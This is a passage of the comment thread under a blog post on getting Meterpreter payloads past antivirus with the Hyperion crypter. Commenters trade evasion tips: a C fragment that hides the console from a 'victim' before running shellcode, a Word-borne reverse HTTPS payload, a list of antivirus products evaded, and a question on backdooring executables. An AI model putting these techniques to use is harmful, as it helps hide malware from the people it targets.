+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-907">
+						<time datetime="2012-08-29T08:20:09-06:00">
+							August 29, 2012 at 8:20 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-911" class="comment even depth-3 parent">
+		<article id="div-comment-911" class="comment-body clear">
+			<div class="comment-content">
+				<p>Thank you very much for your response. Yes I understand it now. Just a quick follow up. Since there is practically no big difference between an EXE and a DLL, can we do the same technique and create our own DLL, then replace the default metsrv.dll file with our own custom meterpreter DLL and use it as our payload? I would be very interested in your response because if you think that is going to work (I think it shouldn&#8217;t have any problem), then I will work on this method.</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=911#respond' data-commentid="911" data-postid="269" data-belowelement="div-comment-911" data-respondelement="respond" data-replyto="Reply to void_in" aria-label='Reply to void_in'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/1443bef7663f2d6c3db9927567a3d11a?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/1443bef7663f2d6c3db9927567a3d11a?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">void_in</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-911">
+						<time datetime="2012-08-30T03:40:56-06:00">
+							August 30, 2012 at 3:40 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-912" class="comment byuser comment-author-ctruncer bypostauthor odd alt depth-4">
+		<article id="div-comment-912" class="comment-body clear">
+			<div class="comment-content">
+				<p>I have not attempted to modify how dlls are created, although it would definitely be worth looking into.</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=912#respond' data-commentid="912" data-postid="269" data-belowelement="div-comment-912" data-respondelement="respond" data-replyto="Reply to CTruncer" aria-label='Reply to CTruncer'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn"><a href='http://www.christophertruncer.com' rel='external nofollow ugc' class='url'>CTruncer</a></cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-912">
+						<time datetime="2012-08-30T08:30:05-06:00">
+							August 30, 2012 at 8:30 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+
+	<li id="comment-940" class="comment even thread-odd thread-alt depth-1 parent">
+		<article id="div-comment-940" class="comment-body clear">
+			<div class="comment-content">
+				<p>I have created a reverse https payload  vb  script to inject it  through ms word. The file is undetectable  by   antivirus, however,  when the script runs, it pulls  some .exe files which antivirus detects and prevents the    script from completing. Any suggestions on that?</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=940#respond' data-commentid="940" data-postid="269" data-belowelement="div-comment-940" data-respondelement="respond" data-replyto="Reply to Deepkia" aria-label='Reply to Deepkia'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/cc69912d1f43c69ae8aedcce621f919f?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/cc69912d1f43c69ae8aedcce621f919f?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">Deepkia</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-940">
+						<time datetime="2012-10-04T09:58:20-06:00">
+							October 4, 2012 at 9:58 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-941" class="comment byuser comment-author-ctruncer bypostauthor odd alt depth-2">
+		<article id="div-comment-941" class="comment-body clear">
+			<div class="comment-content">
+				<p>What AV solution are you going against?</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=941#respond' data-commentid="941" data-postid="269" data-belowelement="div-comment-941" data-respondelement="respond" data-replyto="Reply to CTruncer" aria-label='Reply to CTruncer'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn"><a href='http://www.christophertruncer.com' rel='external nofollow ugc' class='url'>CTruncer</a></cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-941">
+						<time datetime="2012-10-07T00:58:56-06:00">
+							October 7, 2012 at 12:58 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+
+	<li id="comment-942" class="comment even thread-even depth-1">
+		<article id="div-comment-942" class="comment-body clear">
+			<div class="comment-content">
+				<p>Hello,<br />
+When we send exe to victim&#8217;s computer, victim encounters a console. When victim closes this console, our session closes.</p>
+<p>We want to hide console from victim. What do you recommend us to hide windows.<br />
+To hide console from vicim this code below can be used: &#8220;ShowWindow( hWnd, SW_HIDE );&#8221;<br />
+And this code work fine.</p>
+<p>But when we want to inject payload, process ends.</p>
+<p>Code is below:</p>
+<p>****************<br />
+int main(void) {<br />
+char Title[256];<br />
+int SizeTitle = sizeof( Title );<br />
+GetConsoleTitle( Title, SizeTitle );<br />
+HWND hWnd = NULL;<br />
+while ( NULL == hWnd )<br />
+{<br />
+    hWnd = FindWindow( NULL, Title );<br />
+}</p>
+<p>ShowWindow( hWnd, SW_HIDE ); //hide windows</p>
+<p>((void ())payload)(); // payload begins</p>
+<p>}<br />
+***************</p>
+<p>Do you have an recommendation to hide console from victom.</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=942#respond' data-commentid="942" data-postid="269" data-belowelement="div-comment-942" data-respondelement="respond" data-replyto="Reply to Ertugrul Basaranoglu" aria-label='Reply to Ertugrul Basaranoglu'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/7d5e80b19d6c6247238b37232033b370?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/7d5e80b19d6c6247238b37232033b370?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">Ertugrul Basaranoglu</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-942">
+						<time datetime="2012-10-10T05:08:24-06:00">
+							October 10, 2012 at 5:08 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+
+	<li id="comment-943" class="comment odd alt thread-odd thread-alt depth-1">
+		<article id="div-comment-943" class="comment-body clear">
+			<div class="comment-content">
+				<p>Instead of hiding the window how about finding the screen size, leaving the window visible but moving it off the edge of the screen.  The only thing is this may not work in a multi screen environment.</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=943#respond' data-commentid="943" data-postid="269" data-belowelement="div-comment-943" data-respondelement="respond" data-replyto="Reply to Sanky" aria-label='Reply to Sanky'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/649f234de3dff73efdf03a2ed7aba976?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/649f234de3dff73efdf03a2ed7aba976?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">Sanky</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-943">
+						<time datetime="2012-10-12T03:52:43-06:00">
+							October 12, 2012 at 3:52 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+
+	<li id="comment-944" class="comment even thread-even depth-1">
+		<article id="div-comment-944" class="comment-body clear">
+			<div class="comment-content">
+				<p>Hi! </p>
+<p>I´ve followed the tutorial as is, with the payload made here and other versions of my own payloads, in every case i test the payload and it works fine, but after i use Hyperion and  test the encrypted payload it stops working, windows pops up a  message about the program stopping to work and the meterpreter session is never established.</p>
+<p>I´m kinda new in all of this, happened to anyone of you?</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=944#respond' data-commentid="944" data-postid="269" data-belowelement="div-comment-944" data-respondelement="respond" data-replyto="Reply to RG." aria-label='Reply to RG.'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/b9518268f62621eb7f53067bcf1f4168?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/b9518268f62621eb7f53067bcf1f4168?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">RG.</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-944">
+						<time datetime="2012-10-16T19:20:31-06:00">
+							October 16, 2012 at 7:20 pm						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+
+	<li id="comment-945" class="comment odd alt thread-odd thread-alt depth-1 parent">
+		<article id="div-comment-945" class="comment-body clear">
+			<div class="comment-content">
+				<p>hello everybody<br />
+when i make this wine hyperion.exe metexecutable.exe encryptedmet.exe<br />
+i got this Error: Could not load FasmAES-1.0\aes10.dll<br />
+please help me</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=945#respond' data-commentid="945" data-postid="269" data-belowelement="div-comment-945" data-respondelement="respond" data-replyto="Reply to hornet" aria-label='Reply to hornet'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/f8d663cd3c2f25c7b3754859e522936f?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/f8d663cd3c2f25c7b3754859e522936f?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">hornet</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-945">
+						<time datetime="2012-11-17T13:11:15-07:00">
+							November 17, 2012 at 1:11 pm						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-946" class="comment even depth-2">
+		<article id="div-comment-946" class="comment-body clear">
+			<div class="comment-content">
+				<p>The Hyperion binary must be launched from the directory containing the FasmAES-1.0 directory.</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=946#respond' data-commentid="946" data-postid="269" data-belowelement="div-comment-946" data-respondelement="respond" data-replyto="Reply to siriusblack225" aria-label='Reply to siriusblack225'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/8ccbd8a23318fe745da2f70867c07179?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/8ccbd8a23318fe745da2f70867c07179?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn"><a href='http://gravatar.com/siriusblack225' rel='external nofollow ugc' class='url'>siriusblack225</a></cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-946">
+						<time datetime="2012-12-27T03:19:31-07:00">
+							December 27, 2012 at 3:19 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+
+	<li id="comment-960" class="comment odd alt thread-even depth-1">
+		<article id="div-comment-960" class="comment-body clear">
+			<div class="comment-content">
+				<p>Theirs not much difference with using Hyperion as using the basic method i.e mixing encoders and amount of times encoded and using the likes of msfvenom TO mix up it up a little </p>
+<p>I CAN get the same results that Hyperion from just  using msfencode , I have several anti viruses installed and I test against all of them</p>
+<p> Hyperion gets caught by</p>
+<p>avira<br />
+bitdefender<br />
+comodo<br />
+esets<br />
+kaspersky<br />
+microsoft essentials ## Ive yet to test !!! TO SEE if it stills gets passed it</p>
+<p>and it escapes detection from the following</p>
+<p>avast    { not bad it does catch more than avg does but not in this occasion }<br />
+avg       { avg is weak by any anti-virus standard }<br />
+clamav { no surprise here}<br />
+fprot     { lets just say its a waste of code and time }</p>
+<p>While I see the example is with Microsoft essential anti-virus I&#8217;ve yet to install that and check it again but its pointless if its only good for microsoft there is very few people that use that &#8230;&#8230; as the best in the market are kaspersky and bitdefender .. if you can manage to get past them your doing well !!!!</p>
+<p>one of the main problems is people keep uploading to the likes of total antivirus and novirusthanks  to check if there back door is good .. some people think that some of these don&#8217;t hand over the viruses to company&#8217;s and the information and files are deleted straight away .. common guys wise up all of theses services get paid  .. its hard enough create good code through assembly and try to play hide and seek with the anti-virus company&#8217;s without people giving the code away !! </p>
+<p>I guess if you know your victims anti-virus and it happens to be one in the escapes  list or Microsoft essentials then its a win other than that its back to the drawing board I&#8217;ve managed to get passed all of them except bitdefender,kaspersky,esets and  Im not giving up Im still trying to get  passed them all</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=960#respond' data-commentid="960" data-postid="269" data-belowelement="div-comment-960" data-respondelement="respond" data-replyto="Reply to mikeindow" aria-label='Reply to mikeindow'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/1086bbc3fca79083b202b56a5874f848?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/1086bbc3fca79083b202b56a5874f848?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">mikeindow</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-960">
+						<time datetime="2013-02-04T11:41:29-07:00">
+							February 4, 2013 at 11:41 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+
+	<li id="comment-961" class="comment even thread-odd thread-alt depth-1">
+		<article id="div-comment-961" class="comment-body clear">
+			<div class="comment-content">
+				<p>Is there a way of backdooring an exe while using this method to bypass antivirus?<br />
+i&#8217;ve tried adding -x to msfvenom, but i only get a blank console window.</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=961#respond' data-commentid="961" data-postid="269" data-belowelement="div-comment-961" data-respondelement="respond" data-replyto="Reply to grimhackerer" aria-label='Reply to grimhackerer'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/0b32393c6bc253b6197af5f07d2d01b7?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/0b32393c6bc253b6197af5f07d2d01b7?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn"><a href='http://gravatar.com/grimhacker' rel='external nofollow ugc' class='url'>grimhackerer</a></cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-961">
+						<time datetime="2013-03-01T12:31:20-07:00">
+							March 1, 2013 at 12:31 pm						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+
+	<li id="comment-1137" class="comment odd alt thread-even depth-1">
+		<article id="div-comment-1137" class="comment-body clear">
+			<div class="comment-content">
+				<p>hello<br />
+to hide a black window in execution of the payload , it simple , follow this </p>
+<p>copy the .c file you have created to a windows machin ,<br />
+install wxDev c++ ,<br />
+open the .c file with wxDev c++<br />
+in tab tools -&gt; compiler option -&gt; LINKED  and set  &#8216;Yes&#8217;  to option  &#8220;Do not create consol window&#8221;</p>
+<p>Hope this help you 🙂</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=1137#respond' data-commentid="1137" data-postid="269" data-belowelement="div-comment-1137" data-respondelement="respond" data-replyto="Reply to Mohamed" aria-label='Reply to Mohamed'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/9f5f808faabcc0a157f977d79227c490?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/9f5f808faabcc0a157f977d79227c490?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">Mohamed</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-1137">
+						<time datetime="2013-12-08T14:35:41-07:00">
+							December 8, 2013 at 2:35 pm						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+
+	<li id="comment-1152" class="pingback even thread-odd thread-alt depth-1 clear">
+		<div class="comment-body">
+			Pingback: <a href='http://www.nnbbxx.net/post-239.html' rel='external nofollow ugc' class='url'>那些年一起绕过的杀软 &#8211; NNBBXX&#039;s blog 爱网络|爱生活|爱学习</a> 		</div>
+
+	</li><!-- #comment-## -->
+
+	<li id="comment-1163" class="comment odd alt thread-even depth-1">
+		<article id="div-comment-1163" class="comment-body clear">
+			<div class="comment-content">
+				<p>Hi!</p>
+<p>I installed the Hyperion, the beginning, some .dll files are not found, but I added them manually, now I had a problem that is after the command.:<br />
+&#8220;wine /root/.wine/drive_c/MinGW/bin/g++.exe ./Src/Crypter/*.cpp -o crypter.exe&#8221;<br />
+writes it:<br />
+&#8220;fixme:ntdll:NtSetInformationToken unimplemented class 4<br />
+fixme:ntdll:NtQueryInformationProcess (process=0xffffffff) Unimplemented information class: ProcessSessionInformation&#8221;</p>
+<p>&#8230;and then do nothing! </p>
+<p>Anyone know what could be the problem?<br />
+Thank you in advance for your help and sorry my english knowledge!</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=1163#respond' data-commentid="1163" data-postid="269" data-belowelement="div-comment-1163" data-respondelement="respond" data-replyto="Reply to Enmerkar" aria-label='Reply to Enmerkar'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/3318400bf3906b5f35baea4099db2fb8?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/3318400bf3906b5f35baea4099db2fb8?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">Enmerkar</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-1163">
+						<time datetime="2014-03-08T09:55:52-07:00">
+							March 8, 2014 at 9:55 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+		</ol><!-- .comment-list -->
+
+		
+	
+	
+	
+		<div id="respond" class="comment-respond">
+							<h3 id="reply-title" class="comment-reply-title">Leave a Reply					<small><a rel="nofollow" id="cancel-comment-reply-link" href="/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#respond" style="display:none;">Cancel reply</a></small>
+				</h3>
+						<form id="commentform" class="comment-form">
+				<iframe title="Comment Form" src="https://jetpack.wordpress.com/jetpack-comment/?blogid=14525251&#038;postid=269&#038;comment_registration=0&#038;require_name_email=1&#038;stc_enabled=1&#038;stb_enabled=1&#038;show_avatars=1&#038;avatar_default=retro&#038;greeting=Leave+a+Reply&#038;greeting_reply=Leave+a+Reply+to+%25s&#038;color_scheme=light&#038;lang=en_US&#038;jetpack_version=9.0.2&#038;show_cookie_consent=10&#038;has_cookie_consent=0&#038;token_key=%3Bnormal%3B&#038;sig=54b9a875769f1371484bfd30a7ba4df4fba37813#parent=https%3A%2F%2Fwww.christophertruncer.com%2Fbypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun%2F" style="width:100%; height: 430px; border:0;" name="jetpack_remote_comment" class="jetpack_remote_comment" id="jetpack_remote_comment" sandbox="allow-same-origin allow-top-navigation allow-scripts allow-forms allow-popups"></iframe>
+									<!--[if !IE]><!-->
+					<script>
+						document.addEventListener('DOMContentLoaded', function () {
+							var commentForms = document.getElementsByClassName('jetpack_remote_comment');
+							for (var i = 0; i < commentForms.length; i++) {
+								commentForms[i].allowTransparency = false;
+								commentForms[i].scrolling = 'no';
+							}
+						});
+					</script>
+					<!--<![endif]-->
+							</form>
+		</div>
+
+		
+		<input type="hidden" name="comment_parent" id="comment_parent" value="" />
+
+		
+</div><!-- #comments -->
+
+		
+		</main><!-- #main -->
+	</div><!-- #primary -->
+
+
+	</div><!-- #content -->
+
+	<footer id="colophon" class="site-footer" role="contentinfo">
+			<div id="secondary" class="widget-areas clear" role="complementary">
+							<div class="first widget-area">
+				<aside id="twitter_timeline-2" class="widget widget_twitter_timeline"><h1 class="widget-title">@ChrisTruncer</h1><a class="twitter-timeline" data-height="400" data-theme="light" data-border-color="#e8e8e8" data-lang="EN" data-partner="jetpack" data-widget-id="256184182714269696" href="https://twitter.com/256184182714269696">My Tweets</a></aside>
+		<aside id="recent-posts-3" class="widget widget_recent_entries">
+		<h1 class="widget-title">Recent Posts</h1>
+		<ul>
+											<li>
+					<a href="https://www.christophertruncer.com/shellcode-manipulation-and-injection-in-python-3/">Shellcode Generation, Manipulation, and Injection in Python 3</a>
+									</li>
+											<li>
+					<a href="https://www.christophertruncer.com/receiving-text-messages-for-your-incoming-beacons/">Receiving Text Messages for your Incoming Beacons</a>
+									</li>
+											<li>
+					<a href="https://www.christophertruncer.com/eyewitness-and-active-account-enumeration/">EyeWitness and Active Scanning</a>
+									</li>
+					</ul>
+
+		</aside>			</div>
+							<div class="second widget-area">
+				<aside id="meta-4" class="widget widget_meta"><h1 class="widget-title">Meta</h1>
+		<ul>
+						<li><a href="https://www.christophertruncer.com/wp-login.php">Log in</a></li>
+			<li><a href="https://www.christophertruncer.com/feed/">Entries feed</a></li>
+			<li><a href="https://www.christophertruncer.com/comments/feed/">Comments feed</a></li>
+
+			<li><a href="https://wordpress.org/">WordPress.org</a></li>
+		</ul>
+
+		</aside><aside id="linkcat-2" class="widget widget_links"><h1 class="widget-title">Blogroll</h1>
+	<ul class='xoxo blogroll'>
+<li><a href="http://www.twitter.com/christruncer" rel="me" title="My Twitter Account" target="_blank">@ChrisTruncer</a></li>
+<li><a href="https://github.com/ChrisTruncer" title="My GitHub account with scripts I&#8217;ve developed." target="_blank">ChrisTruncer &#8211; GitHub</a></li>
+
+	</ul>
+</aside>
+			</div>
+					</div><!-- #secondary -->
+
+		<div class="site-info">
+						<div class="footer-search">
+				<form role="search" method="get" class="search-form" action="https://www.christophertruncer.com/">
+	<label>
+		<span class="screen-reader-text">Search for:</span>
+		<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s">
+	</label>
+	<input type="submit" class="search-submit" value="Search">
+</form>
+			</div>
+			<div class="footer-credits">
+								<a href="http://wordpress.org/" rel="generator">Proudly powered by WordPress</a>
+				<span class="sep"> | </span>
+				Theme: Typo by <a href="http://okaythemes.com" rel="designer">Okay Themes</a>.			</div>
+		</div><!-- .site-info -->
+	</footer><!-- #colophon -->
+</div><!-- #page -->
+
+	<div style="display:none">
+	<div class="grofile-hash-map-2f12435b246b2f4cde3f6ee75086f738">
+	</div>
+	<div class="grofile-hash-map-642710444f9f3c815ee898c72b6481ed">
+	</div>
+	<div class="grofile-hash-map-bcdd36dd88403214f2f0ae851584aa5d">
+	</div>
+	<div class="grofile-hash-map-c63105fa2717f06c2d73fcb2fa58aac6">
+	</div>
+	<div class="grofile-hash-map-315101977fa6d0f05d6404a8c322c906">
+	</div>
+	<div class="grofile-hash-map-1443bef7663f2d6c3db9927567a3d11a">
+	</div>
+	<div class="grofile-hash-map-cc69912d1f43c69ae8aedcce621f919f">
+	</div>
+	<div class="grofile-hash-map-7d5e80b19d6c6247238b37232033b370">
+	</div>
+	<div class="grofile-hash-map-649f234de3dff73efdf03a2ed7aba976">
+	</div>
+	<div class="grofile-hash-map-b9518268f62621eb7f53067bcf1f4168">
+	</div>
+	<div class="grofile-hash-map-f8d663cd3c2f25c7b3754859e522936f">
+	</div>
+	<div class="grofile-hash-map-8ccbd8a23318fe745da2f70867c07179">
+	</div>
+	<div class="grofile-hash-map-1086bbc3fca79083b202b56a5874f848">
+	</div>
+	<div class="grofile-hash-map-0b32393c6bc253b6197af5f07d2d01b7">
+	</div>
+	<div class="grofile-hash-map-9f5f808faabcc0a157f977d79227c490">
+	</div>
+	<div class="grofile-hash-map-3318400bf3906b5f35baea4099db2fb8">
+	</div>
+	</div>
+
+	<script type="text/javascript">
+		window.WPCOM_sharing_counts = {"https:\/\/www.christophertruncer.com\/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun\/":269};
+	</script>
+					<div id="sharing_email" style="display: none;">
+		<form action="/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/" method="post">
+			<label for="target_email">Send to Email Address</label>
+			<input type="email" name="target_email" id="target_email" value="" />
+
+			
+				<label for="source_name">Your Name</label>
+				<input type="text" name="source_name" id="source_name" value="" />
+
+				<label for="source_email">Your Email Address</label>
+				<input type="email" name="source_email" id="source_email" value="" />
+
